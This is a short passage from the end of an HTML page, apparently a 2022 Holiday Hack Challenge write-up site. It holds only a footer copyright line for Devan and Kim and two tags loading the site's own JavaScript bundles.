class="footer__copyright">Copyright © 2023 Devan and Kim</div></div></div></footer></div>
<script src="/hhc2022/assets/js/runtime~main.21009385.js"></script>
<script src="/hhc2022/assets/js/main.388b6a01.js"></script>
</body>
</html>